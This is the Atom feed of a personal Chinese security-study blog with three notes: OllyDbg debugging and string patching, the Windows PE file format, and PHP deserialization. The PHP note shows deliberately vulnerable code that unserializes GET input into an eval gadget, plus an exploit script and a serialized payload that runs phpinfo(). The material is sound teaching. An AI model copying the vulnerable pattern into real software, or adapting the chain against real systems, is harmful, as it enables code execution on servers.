<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-02-11T09:02:00.914Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OD操作和RE基本思路</title>
    <link href="http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-11T07:58:51.000Z</published>
    <updated>2020-02-11T09:02:00.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD基本操作和RE基本思想"><a href="#OD基本操作和RE基本思想" class="headerlink" title="OD基本操作和RE基本思想"></a>OD基本操作和RE基本思想</h1><p>这篇写一些比较简单的知识，主要用来记录od的一些操作和介绍一些RE基本的操作和思想</p><h2 id="OD操作"><a href="#OD操作" class="headerlink" title="OD操作"></a>OD操作</h2><ul><li><p>F2 ：下断点</p></li><li><p>F4 :  执行到光标所在的位置</p></li><li><p>F9 ：debug程序</p></li><li><p>F7 :   单步步进（step into）</p></li><li><p>F8 :   单步步过（step over）</p></li></ul><ul><li><p>ctrl + F9 ：一直在函数代码内部运行，直到遇到RETN</p></li><li><p>ctrl + F2 ：重新开始调试</p></li><li><p>ctrl + G : 移动到指定位置</p></li><li><p>ctrl + E ：编辑数据</p></li></ul><ul><li><p>； ： 用来添加注释（得把输入法改为英文才可以用）</p></li><li><p>： ： 用来添加标签（得把输入法改为英文才可以用）</p></li><li><p>space ：修改汇编代码</p></li><li><p>enter ：若光标处有call/jmp等指令，则跟踪并显示相关地址</p></li></ul><h2 id="快速回到“据点”方法"><a href="#快速回到“据点”方法" class="headerlink" title="快速回到“据点”方法"></a>快速回到“据点”方法</h2><ul><li>ctrl + G 输入据点地址，直接回到据点的位置</li><li>在每个据点 F2 设置断点</li><li>在每个据点处 ：添加注释</li><li>在每个据点处 ；添加标签</li></ul><h2 id="EP概念"><a href="#EP概念" class="headerlink" title="EP概念"></a>EP概念</h2><p>EP是<strong>windows可执行文件的代码入口点</strong>。</p><p>是执行应用程序时最先执行的代码的起始位置，依赖于CPU。</p><blockquote><p>重点：EP并不是main函数入口。调试代码时，出现在EP位置的是开发工具（Visual C++等）生成的启动函数。</p></blockquote><h2 id="快速找到指定代码的四种方法"><a href="#快速找到指定代码的四种方法" class="headerlink" title="快速找到指定代码的四种方法"></a>快速找到指定代码的四种方法</h2><p>如何快速找到需要的代码（如main入口等），有下面四种方法。下面的例子假设都是为了找到程序中的 main 函数。而 main 的内容是调用了系统的 MessageBoxW() API 然后弹出 helloworld： </p><h3 id="1、代码执行法"><a href="#1、代码执行法" class="headerlink" title="1、代码执行法"></a>1、代码执行法</h3><p><strong>不断按 F8（不跟踪进函数内部）执行程序</strong>。</p><p>当函数执行到某一时刻程序弹出了窗口显示hello world，就可以判断该函数就是所找的 main 函数。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B3%95.png" alt></p><h3 id="2、字符串检索法"><a href="#2、字符串检索法" class="headerlink" title="2、字符串检索法"></a>2、字符串检索法</h3><p><strong>右键 -&gt; Search for -&gt; All referenced text strings</strong>，这样就能看到程序代码引用的字符串并整理到列表中。</p><p>那么我们就可以检索 hello world 然后定位到 main 函数的位置。</p><blockquote><p>吾爱破解版的可以使用 <strong>右键 -&gt; 中文搜索引擎 -&gt; 智能搜索</strong>  实现检索字符串。如果使用上面的选项是无法得到预期结果的。</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%99%BA%E8%83%BD%E6%90%9C%E7%B4%A2.png" alt></p><h3 id="3、API检索法-1"><a href="#3、API检索法-1" class="headerlink" title="3、API检索法-1"></a>3、API检索法-1</h3><p><strong>右键 -&gt; Search for -&gt; All intermodular calls</strong>，这样就能看到程序代码运行时调用的 API 函数列表。</p><p>那么我们知道 main 函数调用了一个窗口显示hello world，我们就能对应找到窗口调用API MessageBoxW，然后定位到 main 。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-1.png" alt></p><h3 id="4、API检索法-2"><a href="#4、API检索法-2" class="headerlink" title="4、API检索法-2"></a>4、API检索法-2</h3><p><strong>右键 -&gt; Search for -&gt; Name in all calls</strong>。od不能给所有可执行文件都列出API函数列表(压缩或者保护器等)，使用这个命令可以列出被加载的DLL文件提供的所有API。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-2.png" alt></p><h2 id="打补丁修改字符串"><a href="#打补丁修改字符串" class="headerlink" title="打补丁修改字符串"></a>打补丁修改字符串</h2><h3 id="1、直接修改字符串缓冲区"><a href="#1、直接修改字符串缓冲区" class="headerlink" title="1、直接修改字符串缓冲区"></a>1、直接修改字符串缓冲区</h3><p>由od我们能看出 hello world 字符串的内存位置 0x4092A0</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%8D%E7%BD%AE.png" alt></p><p>直接到dump窗口中 ctrl + G 定位到字符串，选中修改的字符串段并用 <strong>ctrl + E</strong> 打开编辑</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E7%BC%96%E8%BE%91.png" alt></p><p>将字符串 world 修改为 shabi 并保存 </p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9.png" alt></p><p>再次F9运行可以看到结果已经改变了</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%94%B9%E5%8F%98.png" alt></p><h3 id="2、在其他区域生成新字符串并传递给消息函数"><a href="#2、在其他区域生成新字符串并传递给消息函数" class="headerlink" title="2、在其他区域生成新字符串并传递给消息函数"></a>2、在其他区域生成新字符串并传递给消息函数</h3><p>通过od我们能看到 main 函数中，0x401007地址的地方有一条 push 004092A0 的命令，它是将 4092A0 地址的 hello world 字符串以参数传递给 MessageBoxW函数。所以我们可以<strong>修改字符串地址</strong>指向我们新建的位置。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98.png" alt></p><p>这里在dump窗口中找到 409F50的位置，选中需要的位置并加入字符串</p><blockquote><p>值得注意的是 unicode 字符在内存中保存每个字符后面都得加上 0x00 ；</p><p>并且 unicode 字符串结尾需要 NULL 即需要两个 0x00；</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%88%90%E5%8A%9F.png" alt></p><p>可见参数被我们修改为指向新建立的那一段内存中的字符串，函数成功执行为显示其他的内容。</p><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p>选中修改内容 -&gt; 右键 -&gt; Copy to executable file -&gt; 在弹出的窗口中右键 -&gt; Save file -&gt; 保存为exe文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一篇知识简单的介绍了od的一些操作，并介绍了定位关键函数和修改字符串参数的一些具体操作，打好基础。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;a href=&quot;#OD基本操作和RE基本思想&quot; class=&quot;headerlink&quot; title=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;/a&gt;OD基本操作和RE基本思想&lt;/h1&gt;&lt;p&gt;这篇写一些比较简单的知识，主要用来记录od的一些操作
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PE文件</title>
    <link href="http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/"/>
    <id>http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/</id>
    <published>2020-02-09T06:34:22.000Z</published>
    <updated>2020-02-09T08:30:20.376Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。</p><h2 id="PE概念"><a href="#PE概念" class="headerlink" title="PE概念"></a>PE概念</h2><p>PE是windows平台下可执行文件的格式</p><p>32位的可执行文件称为<strong>PE文件或者PE32</strong></p><p>64位的可执行文件称为<strong>PE+或者PE32+</strong></p><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>不同PE文件的主拓展名</p><ul><li>可执行系列 ：EXE 、SCR</li><li>库系列的 ：DLL、OCX、CPL、DRV</li><li>驱动程序系列 ：SYS、VXD</li><li>对象文件系列 ：OBJ</li></ul><h2 id="PE文件基本结构"><a href="#PE文件基本结构" class="headerlink" title="PE文件基本结构"></a>PE文件基本结构</h2><ul><li>PE头：DOS头到节区头的部分</li><li>PE体：PE头下的节区合称PE体</li><li>文件的内容一般可以分为<strong>代码 .text 、数据 .data 、资源 .rsrc节</strong>分别保存</li><li>各节区头定义了各节区在文件或者内存中的大小、位置、属性等</li></ul><p>文件中使用<strong>偏移</strong>来表示位置，而在内存中使用<strong>VA(虚拟地址)</strong>来表示位置。</p><p>下面放一张notepad被加载到内存中的情形：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><h2 id="PE头结构"><a href="#PE头结构" class="headerlink" title="PE头结构"></a>PE头结构</h2><h3 id="1、DOS头（IMAGE-DOS-HEADER）"><a href="#1、DOS头（IMAGE-DOS-HEADER）" class="headerlink" title="1、DOS头（IMAGE_DOS_HEADER）"></a>1、DOS头（IMAGE_DOS_HEADER）</h3><p>DOS头即是在PE头的最前面添加一个 IMAGE_DOS_HEADER 结构体，用来拓展已有的DOS EXE头。结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/dos%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中最重要的两个成员变量：</p><ul><li>e_magic : <strong>DOS签名</strong>。</li><li>e_lfanew ：<strong>指示NT头的偏移</strong>。</li></ul><p>下面是notepad++的DOS头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84DOS%E5%A4%B4.png" alt></p><p>可以看出：</p><ul><li>开头WORD型的4D5A，即是e_magic，代表签名MZ；</li><li>末尾LONG型的00000110，即是e_lfanew，指向NT头；（Intel的小端序标识）</li></ul><h3 id="2、DOS存根"><a href="#2、DOS存根" class="headerlink" title="2、DOS存根"></a>2、DOS存根</h3><p>位于DOS头的下方，为可选项且大小不固定。</p><p>下面是notepad++的DOS存根：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84dos%E5%AD%98%E6%A0%B9.png" alt></p><blockquote><p>由于PE头中的DOS头中的e_lfanew指向的是NT头，说明中间的DOS存根是00000030 - 00000110的内容</p></blockquote><h3 id="3、NT头（IMAGE-NT-HEADERS）"><a href="#3、NT头（IMAGE-NT-HEADERS）" class="headerlink" title="3、NT头（IMAGE_NT_HEADERS）"></a>3、NT头（IMAGE_NT_HEADERS）</h3><p>NT头 IMAGE_NT_HEADERS 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>具有三个成员：</p><ul><li>签名 (504500，即PE00)</li><li>文件头</li><li>可选头</li></ul><h4 id="3-1、NT头中的文件头（IMAGE-FILE-HEADER）"><a href="#3-1、NT头中的文件头（IMAGE-FILE-HEADER）" class="headerlink" title="3.1、NT头中的文件头（IMAGE_FILE_HEADER）"></a>3.1、NT头中的文件头（IMAGE_FILE_HEADER）</h4><p>NT头中的文件头结构 IMAGE_FILE_HEADER 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/nt%E5%A4%B4%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><p>具有四个重要的成员：</p><ul><li>Machine：用于标识Machine码</li><li>NumberOfSections：用于指出文件中存在的节区数量</li><li>SizeOfOptionalHeader：用于指出 IMAGE_OPTIONAL_HEADER32 结构体的长度，其中IMAGE_OPTIONAL_HEADER32 是NT头最后一个成员</li><li>Characterstics：用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息</li></ul><p>下面是notepad的文件头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><h4 id="3-2、NT头中的可选头（IMAGE-OPTIONAL-HEADER32）"><a href="#3-2、NT头中的可选头（IMAGE-OPTIONAL-HEADER32）" class="headerlink" title="3.2、NT头中的可选头（IMAGE_OPTIONAL_HEADER32）"></a>3.2、NT头中的可选头（IMAGE_OPTIONAL_HEADER32）</h4><p>IMAGE_OPTIONAL_HEADER32是PE头结构中最大的结构体</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B41.png" alt></p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B42.png" alt></p><p>其中重要的成员：</p><ul><li>Magic：Magic为10B-20B</li><li>AddressOfEntryPoint：持有EP的RVA值，指出<strong>程序最先执行的代码的起始地址</strong></li><li>ImageBase：指出<strong>文件的优先装入地址</strong></li><li>SectionAlignment，FileAlignment：分别指出节区在磁盘中的最小单位和节区在内存中最小单位</li><li>SizeOfImage：指出了PE Image在虚拟内存中所占空间大小</li><li>SizeOfHeader：指出整个PE头的大小</li><li>Subsystem：区分系统驱动和普通的可执行文件</li><li>NumberOfRvaAndSize：指出DataDirectory数组的个数</li><li>DataDirectory：IMAGE_DATA_DIRECTORY结构体组成的数组</li></ul><h3 id="4、节区头（-IMAGE-SECTION-HEADER）"><a href="#4、节区头（-IMAGE-SECTION-HEADER）" class="headerlink" title="4、节区头（ IMAGE_SECTION_HEADER）"></a>4、节区头（ IMAGE_SECTION_HEADER）</h3><p>节区头是由 IMAGE_SECTION_HEADER 结构体组成的数组。每个结构体对应着一个节区</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/%E8%8A%82%E5%8C%BA%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中重要的成员：</p><ul><li>VirtualSize：内存中节区所占大小</li><li>VirtualAddress：<strong>内存中节区起始地址（RVA）</strong></li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li>PointerToRawData：<strong>磁盘文件中节区起始位置</strong></li><li>Charaterstics：节区属性（bit OR）</li></ul><blockquote><p>VirtualAddress与PointerToRawData不带任何值，分别由SectionAlignment和FileAlignment确定</p></blockquote><blockquote><p>一般来说VirtualSize和SizeOfRawData具有不同的值，即磁盘中节区大小与加载到内存中的节区大小是不同的</p></blockquote><h2 id="PE由磁盘映射到内存"><a href="#PE由磁盘映射到内存" class="headerlink" title="PE由磁盘映射到内存"></a>PE由磁盘映射到内存</h2><p>PE文件加载到内存，每个<strong>节区</strong>都能完成<strong>内存地址与文件偏移</strong>之间的映射。这种映射一般叫做 RVA to RAW </p><p>计算这种映射的方法：</p><ul><li>查找RVA所在的节区</li><li>使用下面公式计算文件偏移RAW</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RAW - PointerToRawData = RVA - VirtualAddress</span><br><span class="line">即</span><br><span class="line">RAW = RVA - VirtualAddress + PpinterToRawData</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>暂时先写到这里，后面还有好多…等慢慢补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PE文件&quot;&gt;&lt;a href=&quot;#PE文件&quot; class=&quot;headerlink&quot; title=&quot;PE文件&quot;&gt;&lt;/a&gt;PE文件&lt;/h1&gt;&lt;p&gt;继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-01-27T07:29:41.000Z</published>
    <updated>2020-01-27T10:00:45.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容</p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><ul><li>序列化：将<code>对象或者数组（变量）</code>转换为一个<code>（可保存/传输）字符串</code></li><li>反序列化：将序列化后的得到的<code>字符串</code>反序列化为其<code>原始的对象结构</code></li></ul><p>php中常用的序列化和反序列化的函数有：</p><p><code>serialize、unserialize、json_encode、json_decode</code></p><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>通过序列化操作，可以将<code>变量转化为字符串</code>。进而可以方便的进行<code>存储和传输</code>，减轻服务器的压力</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个”精心”构造的序列化字符串，从而<code>控制对象</code>内部的<code>变量</code>甚至是<code>函数</code>，从而达成攻击的目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li>__construct() ：构造函数。当对象创建（new）时会自动调用。但在unserialize()时不会自动调用</li><li>__destruct() ：析构函数。在对象被销毁时会自动调用</li><li>__toString() ：当一个对象被当作一个字符串时就会调用。</li><li>__sleep() ：在对象被序列化之前运行</li><li>__wakeup() ：在对象被反序列化之后被调用</li></ul><p>调用的顺序如下面的程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'construct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'destruct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'wakeup run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'sleep run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'toString run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'string '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$s_a = serialize($a);</span><br><span class="line"><span class="comment">#var_dump($s_a);</span></span><br><span class="line">$un_a = unserialize($s_a);</span><br><span class="line"><span class="keyword">echo</span> $un_a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行的结果如下所示：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%93%E6%9E%9C.png" alt></p><p>分析一下上面出现结果的顺序原因：</p><p>首先我调用了new实例化了一个<code>对象 $a</code> ，这时候就会自动调用了construct；</p><p>其次我对实例化出来的<code>对象 $a</code> 进行序列化操作，在序列化操作前会先执行 sleep函数，然后在对对象进行序列化得到<code>字符串$s_a</code>；</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt></p><blockquote><p>注：上图中出现的字符串结果是去掉源码中注释符后重新运行代码由 var_dump($s_a) 所得</p></blockquote><p>然后执行到了unserialize 函数，调用后先对序列化<code>字符串 $s _a</code> 进行反序列化得到<code>对象 $un_a</code> 后再自动调用 wakeup方法；</p><p>然后调用echo函数，<code>$un_a 对象</code>被当作字符串，自动调用了toString方法；</p><p>最后程序执行结束，构造的两个<code>对象 $un_a 和 $a</code> 被释放，自动调用了两次析构函数destruct；</p><p>至此，我们对序列化和反序列化以及魔术方法的调用有了一定的认识</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>用一个在网上随便找来的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"x1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2  = <span class="keyword">new</span> maniac();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们定位到了反序列化操作 unserialize ，其中参数 test 是我们可控的变量</p><p>很明显，我们的目标是调用 类 x2 中的 eval 方法，但他<code>不是写在魔术方法</code>中，不能直接通过反序列化进行控制。</p><p>继续观察，看到了 maniac 类中的 destruct 魔术方法可以控制 $test 成员变量（一个类）中的 action 方法。</p><p>我们就可以构成利用链： 通过 test 参数传入 maniac 类的序列化字符串，其中的 test 指定为 x2 。这样当程序执行到 unserialize 的时候就会先反序列化操作，随后程序执行完毕，对象销毁而调用危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EXP编写如下：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2=<span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$answer = <span class="keyword">new</span> maniac();</span><br><span class="line">print_r(serialize($answer));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后得到我们的 PAYLOAD:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"maniac"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;O:<span class="number">2</span>:<span class="string">"x2"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个坑点就是 phpinfo(); 后面如果没有加上 ‘ ; ‘ ，就会执行失败。</p></blockquote><p>在wamp环境下执行的结果如下：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo%E7%BB%93%E6%9E%9C.png" alt></p><p>可以看到上面的利用链构造成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP的反序列只是弟弟知识，以后补上java的这部分的知识。把web的填满，再继续底层的研究，继续努力</p>]]></content>
    
    <summary type="html">
    
      
      
